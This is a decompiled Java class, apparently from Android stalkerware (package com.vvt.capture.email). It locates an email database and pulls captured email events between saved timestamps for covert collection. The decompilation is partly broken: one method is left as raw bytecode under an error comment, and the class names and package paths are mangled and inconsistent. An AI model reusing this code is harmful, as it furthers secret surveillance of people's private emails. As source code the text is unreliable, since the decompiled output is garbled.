package com.vvt.capture.email.b.a;

import android.os.SystemClock;
import com.vvt.ak.a;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.capture.email.generic.EmailEventReference;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;

public class d
  implements f
{
  private static final boolean a = a.a;
  private static final boolean b = a.d;
  private static final boolean c = a.e;
  private long d = 0L;
  private String e;
  private String f;
  
  public d(String paramString)
  {
    this.e = paramString;
  }
  
  /* Error */
  public g a()
  {
    // Byte code:
    //   0: lconst_0
    //   1: lstore_1
    //   2: aconst_null
    //   3: astore_3
    //   4: new 38	com/vvt/capture/email/generic/EmailEventReference
    //   7: astore 4
    //   9: aload 4
    //   11: invokespecial 39	com/vvt/capture/email/generic/EmailEventReference:<init>	()V
    //   14: new 41	java/io/File
    //   17: astore 5
    //   19: getstatic 45	com/vvt/capture/email/removeFromPath/MyUncaughtExceptionHandler:a	Ljava/lang/String;
    //   22: astore 6
    //   24: aload 5
    //   26: aload 6
    //   28: invokespecial 48	java/io/File:<init>	(Ljava/lang/String;)V
    //   31: aload 5
    //   33: invokevirtual 52	java/io/File:exists	()Z
    //   36: istore 7
    //   38: iload 7
    //   40: ifeq +113 -> 153
    //   43: getstatic 45	com/vvt/capture/email/removeFromPath/MyUncaughtExceptionHandler:a	Ljava/lang/String;
    //   46: astore 6
    //   48: invokestatic 57	com/vvt/capture/email/removeFromPath/removeFromPath:MyUncaughtExceptionHandler	()J
    //   51: lstore 8
    //   53: aload 6
    //   55: astore_3
    //   56: lload 8
    //   58: lstore 10
    //   60: lload 10
    //   62: lload_1
    //   63: lcmp
    //   64: istore 7
    //   66: iload 7
    //   68: ifne +65 -> 133
    //   71: getstatic 24	com/vvt/capture/email/removeFromPath/a/d:removeFromPath	Z
    //   74: istore 7
    //   76: iload 7
    //   78: ifeq +3 -> 81
    //   81: aload_0
    //   82: getfield 34	com/vvt/capture/email/removeFromPath/a/d:d	J
    //   85: lstore 12
    //   87: aload_3
    //   88: ifnonnull +6 -> 94
    //   91: ldc 59
    //   93: astore_3
    //   94: aload 4
    //   96: aload_3
    //   97: invokevirtual 62	com/vvt/capture/email/generic/EmailEventReference:setDatabasePath	(Ljava/lang/String;)V
    //   100: lload 12
    //   102: invokestatic 68	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   105: astore_3
    //   106: aload 4
    //   108: aload_3
    //   109: invokevirtual 72	com/vvt/capture/email/generic/EmailEventReference:setReference	(Ljava/lang/Long;)V
    //   112: aload 4
    //   114: areturn
    //   115: astore 5
    //   117: getstatic 28	com/vvt/capture/email/removeFromPath/a/d:MyUncaughtExceptionHandler	Z
    //   120: istore 7
    //   122: iload 7
    //   124: ifeq +3 -> 127
    //   127: lload_1
    //   128: lstore 10
    //   130: goto -70 -> 60
    //   133: aload_0
    //   134: lload 10
    //   136: putfield 34	com/vvt/capture/email/removeFromPath/a/d:d	J
    //   139: lload 10
    //   141: lstore 12
    //   143: goto -56 -> 87
    //   146: astore_3
    //   147: aload 6
    //   149: astore_3
    //   150: goto -33 -> 117
    //   153: aconst_null
    //   154: astore 6
    //   156: lload_1
    //   157: lstore 8
    //   159: goto -106 -> 53
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	162	0	this	d
    //   1	156	1	l1	long
    //   3	106	3	localObject1	Object
    //   146	1	3	localException1	Exception
    //   149	1	3	localObject2	Object
    //   7	106	4	localEmailEventReference	EmailEventReference
    //   17	15	5	localFile	java.io.File
    //   115	1	5	localException2	Exception
    //   22	133	6	str	String
    //   36	87	7	bool	boolean
    //   51	107	8	l2	long
    //   58	82	10	l3	long
    //   85	57	12	l4	long
    // Exception table:
    //   from	to	target	type
    //   14	17	115	java/lang/Exception
    //   19	22	115	java/lang/Exception
    //   26	31	115	java/lang/Exception
    //   31	36	115	java/lang/Exception
    //   43	46	115	java/lang/Exception
    //   48	51	146	java/lang/Exception
  }
  
  public List a(int paramInt)
  {
    bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      Object localObject = com.vvt.capture.email.b.b.a();
      boolean bool2 = a;
      if (bool2) {}
      bool2 = com.vvt.ag.b.a((String)localObject);
      if (!bool2)
      {
        long l1 = com.vvt.capture.email.b.b.c();
        long l2 = com.vvt.capture.email.b.b.a(paramInt, (String)localObject);
        long l3 = 1L;
        l2 -= l3;
        boolean bool3 = a;
        if (bool3) {}
        String str1 = this.e;
        String str2 = this.f;
        localObject = com.vvt.capture.email.b.b.a(l2, l1, str1, str2);
        bool2 = a;
        if (bool2) {}
        localArrayList.addAll((Collection)localObject);
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool1 = c;
        if (!bool1) {}
      }
    }
    bool1 = a;
    if (bool1) {}
    return localArrayList;
  }
  
  public List a(g paramg1, g paramg2)
  {
    bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    bool1 = paramg1 instanceof EmailEventReference;
    if (bool1) {}
    try
    {
      paramg1 = (EmailEventReference)paramg1;
      Object localObject = paramg1.getReference();
      long l1 = ((Long)localObject).longValue();
      paramg2 = (EmailEventReference)paramg2;
      Long localLong = paramg2.getReference();
      long l2 = localLong.longValue();
      long l3 = l2 - l1;
      long l4 = 0L;
      boolean bool2 = l1 < l4;
      if (bool2)
      {
        l4 = 3;
        boolean bool3 = l3 < l4;
        if (!bool3) {}
      }
      else
      {
        l3 = 5000L;
        SystemClock.sleep(l3);
      }
      String str1 = this.e;
      String str2 = this.f;
      localObject = com.vvt.capture.email.b.b.a(l1, l2, str1, str2);
      boolean bool4 = a;
      if (bool4) {}
      localArrayList.addAll((Collection)localObject);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool1 = c;
        if (!bool1) {}
      }
    }
    bool1 = a;
    if (bool1) {}
    return localArrayList;
  }
  
  public void a(String paramString)
  {
    this.f = paramString;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/email/removeFromPath/a/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */